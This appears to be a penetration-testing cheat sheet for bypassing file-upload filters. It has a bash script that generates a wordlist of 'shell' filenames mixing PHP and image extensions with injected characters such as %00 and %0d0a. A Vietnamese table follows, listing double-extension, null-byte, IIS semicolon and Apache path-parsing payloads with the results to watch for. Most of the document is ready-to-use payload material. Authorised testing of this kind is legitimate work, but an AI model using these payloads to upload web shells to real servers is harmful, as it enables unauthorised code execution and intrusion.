
Enhanced Script with More Extensions:
```
#!/bin/bash
# Comprehensive character injection wordlist

# Characters to inject
chars=('%20' '%0a' '%00' '%0d0a' '/' '.\\\\' '.' '…' ':' '%09' '%0b' '%0c')

# PHP extensions
php_exts=('.php' '.phps' '.phtml' '.php3' '.php4' '.php5' '.php7' '.phar')

# Allowed extensions  
allowed_exts=('.jpg' '.jpeg' '.png' '.gif' '.bmp' '.ico')

for char in "\${chars[@]}"; do
    for php_ext in "\${php_exts[@]}"; do
        for allowed_ext in "\${allowed_exts[@]}"; do
            # Before PHP extension
            echo "shell\$char\$php_ext\$allowed_ext" >> char_injection_wordlist.txt
            # After PHP extension
            echo "shell\$php_ext\$char\$allowed_ext" >> char_injection_wordlist.txt
            # Before allowed extension
            echo "shell\$allowed_ext\$char\$php_ext" >> char_injection_wordlist.txt
            # After allowed extension
            echo "shell\$allowed_ext\$php_ext\$char" >> char_injection_wordlist.txt
        done
    done
done

echo "Generated \$(wc -l < char_injection_wordlist.txt) filename permutations"

```



| Bước                     | Mục tiêu                                   | Payload ví dụ                                             | Kết quả cần quan sát                   |
| ------------------------ | ------------------------------------------ | --------------------------------------------------------- | -------------------------------------- |
| Baseline allowed         | Xác nhận extension nào được cho phép       | `.jpg`, `.jpeg`, `.png`, `.gif`                           | Upload success                         |
| Baseline blocked         | Xác nhận extension nguy hiểm bị chặn       | `.php`, `.phtml`, `.php5`                                 | Upload blocked                         |
| Double extension         | Lừa whitelist regex yếu                    | `shell.jpg.php`, `shell.png.php`                          | Upload được và có thể execute          |
| Reverse double extension | Lừa app check đuôi ảnh, server execute PHP | `shell.php.jpg`, `shell.phtml.png`                        | Upload success, thử truy cập file      |
| Character injection      | Lừa parser filename                        | `shell.php%00.jpg`, `shell.php%20.jpg`, `shell.aspx:.jpg` | Upload khác response bình thường       |
| IIS-specific             | Test behavior trên IIS/ASP.NET             | `shell.asp;.jpg`, `shell.aspx;.png`                       | Có thể execute ASP/ASPX nếu config lỗi |
| Apache-specific          | Test Apache/PHP handler/path parsing       | `shell.php/.jpg`, `shell.phtml\\.png`                     | Có thể bị Apache/PHP parse thành PHP   |
